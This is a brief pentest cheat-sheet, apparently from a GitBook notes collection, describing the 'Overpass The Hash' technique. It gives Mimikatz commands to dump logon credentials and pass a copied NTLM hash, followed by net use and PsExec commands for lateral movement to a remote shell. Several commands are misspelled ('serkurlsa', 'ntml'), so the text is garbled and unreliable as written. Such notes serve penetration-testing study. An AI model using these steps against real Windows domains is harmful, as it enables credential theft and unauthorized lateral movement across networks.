# Overpass The Hash

## Mimikatz

```
serkurlsa:logonpasswords
```

_Copy user's NTML hash_

{% code overflow="wrap" %}
```
serkurlsa::pth /user:compromised_user /domain:domain.com /ntml:copied_hash /run:PowerShell.exe
```
{% endcode %}

```
net use \\lateral-machine
```

```
.\psexec.exe \\lateral-machine cmd.exe
```
